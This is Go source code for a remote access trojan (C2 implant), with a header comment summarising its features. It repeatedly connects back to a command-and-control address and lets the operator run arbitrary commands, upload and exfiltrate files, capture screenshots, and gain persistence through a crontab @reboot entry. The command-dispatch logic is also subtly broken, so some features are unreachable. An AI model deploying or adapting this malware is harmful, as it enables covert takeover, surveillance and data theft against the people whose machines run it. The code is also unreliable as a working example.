/*
Summary:
This Go program establishes a connection to a remote server (C2 server) on the address "127.0.0.1:1234" and listens for commands to be executed. The commands can be related to file operations (upload/download), system operations (change directory, take screenshots), and persistent execution of the program after system reboots. The server-client communication uses TCP. The program allows the client to request system information, upload files, download files, and execute arbitrary commands.

Key Features:
- Command to change the current directory.
- File upload and download via base64 encoding/decoding.
- Take a screenshot of the desktop and return it as a base64 string.
- Establish persistence on the system by adding the program to the system's crontab.
- Ability to execute system commands remotely.

Important Functions:
- `connect_home`: Establishes a persistent connection to the remote server.
- `send_resp`: Sends responses back to the server.
- `save_file`: Saves uploaded files after decoding base64.
- `get_file`: Retrieves and base64-encodes a file.
- `take_screenshot`: Takes a screenshot of the desktop and returns it as a base64 string.
- `persist`: Creates a crontab entry for persistence.
- `exec_command`: Executes a system command and returns the output.
*/

package main

import (
	"fmt"
	"bufio"
	"encoding/base64"
	"net"
	"image/png"
	"strings"
	"os"
	"os/exec"
	"time"

	"github.com/kbinani/screenshot"
)

const C2 string = "127.0.0.1:1234"

// main function to establish connection and execute commands
func main() {
	// Establish a connection to the remote server
	conn := connect_home()
	defer conn.Close()

	// Loop to continuously listen for commands from the server
	for {
		reader := bufio.NewReader(conn)
		cmd, _ := reader.ReadString('\n') // Read the incoming command
		cmd = strings.TrimSpace(cmd)      // Trim newline or extra spaces

		// Handle exit condition
		if cmd == "q" || cmd == "quit" {
			send_resp(conn, "Closing Connection")
			break
		} else if cmd[0:2] == "cd" { // Change directory command
			if cmd == "cd" {
				cwd, err := os.Getwd() // Get the current working directory
				if err != nil {
					send_resp(conn, err.Error())
				} else {
					send_resp(conn, cwd)
				}
			} else {
				// Change to the target directory
				target_dir := strings.Split(cmd, " ")[1]
				if err := os.Chdir(target_dir); err != nil {
					send_resp(conn, err.Error())
				} else {
					send_resp(conn, target_dir)
				}
			}

		} else if strings.Contains(cmd, ":") { // Check if the command is for file operations
			tmp := strings.Split(cmd, ":")
			if len(tmp) > 1 {
				// Handle file upload
				if save_file(tmp[0], tmp[1]) {
					send_resp(conn, "File Uploaded Successfully")
				} else {
					send_resp(conn, "Error Uploading File")
				}
			} else if len(tmp) > 1 && tmp[0] == "download" {
				// Handle file download
				send_resp(conn, get_file(tmp[1]))
			} else if cmd == "screenshot" {
				// Handle screenshot capture
				send_resp(conn, take_screenshot())
			} else if cmd == "persist" {
				// Handle persistence setup
				send_resp(conn, persist())
			} else {
				// Execute arbitrary command
				send_resp(conn, exec_command(cmd))
			}
		}
	}
}

// persist function creates a crontab entry for persistence
func persist() string {
	file_name := "/tmp/persist"
	file, err := os.Create(file_name) // Create a file for crontab entry
	if err != nil {
		return "Error creating persistence file: " + err.Error()
	}
	defer file.Close()

	// Get the path of the current executable
	exec_path, _ := os.Executable()
	if err != nil {
		return "Error retrieving executable path: " + err.Error()
	}

	// Write crontab entry for persistence
	fmt.Fprintf(file, "@reboot %s\n", exec_path)
	_, err = exec.Command("/usr/bin/crontab", file_name).CombinedOutput()
	os.Remove(file_name)
	if err != nil {
		return "Error establishing Persistence"
	}
	return "Persistence has been established successfully"
}

// connect_home establishes a TCP connection to the C2 server
func connect_home() net.Conn {
	conn, err := net.Dial("tcp", C2)
	if err != nil {
		time.Sleep(time.Second * 30) // Retry after 30 seconds if the connection fails
		return connect_home()
	}
	return conn
}

// send_resp sends a response message to the server
func send_resp(conn net.Conn, msg string) {
	fmt.Fprintf(conn, "%s", msg)
}

// save_file saves the file content (base64 encoded) to the disk
func save_file(file_name string, b64_string string) bool {
	// Decode the base64 string and save to file
	temp := b64_string[2 : len(b64_string)-1]
	content, _ := base64.StdEncoding.DecodeString(temp)
	if err := os.WriteFile(file_name, content, 0644); err != nil {
		return false
	}
	return true
}

// get_file retrieves the file content as a base64 encoded string
func get_file(file string) string {
	if !file_exists(file) {
		return "File not Found"
	}
	return file_b64(file)
}

// file_exists checks if a file exists on the system
func file_exists(file string) bool {
	if _, err := os.Stat(file); err != nil {
		return false
	}
	return true
}

// file_b64 encodes the content of the file to a base64 string
func file_b64(file string) string {
	content, _ := os.ReadFile(file)
	return base64.StdEncoding.EncodeToString(content)
}

// take_screenshot captures a screenshot and returns it as a base64 string
func take_screenshot() string {
	bounds := screenshot.GetDisplayBounds(0) // Get the screen bounds
	img, _ := screenshot.CaptureRect(bounds) // Capture the screenshot
	file, _ := os.Create("wallpaper.png")    // Save the screenshot as a PNG file
	defer file.Close()
	png.Encode(file, img) // Encode image to PNG
	b64_string := file_b64("wallpaper.png")  // Encode the file to base64
	os.Remove("wallpaper.png")               // Remove the temporary screenshot file
	return b64_string
}

// exec_command executes a command on the system and returns the output or error
func exec_command(cmd string) string {
	output, err := exec.Command(cmd).Output() // Execute the system command
	if err != nil {
		return err.Error()
	} else {
		return string(output)
	}
}
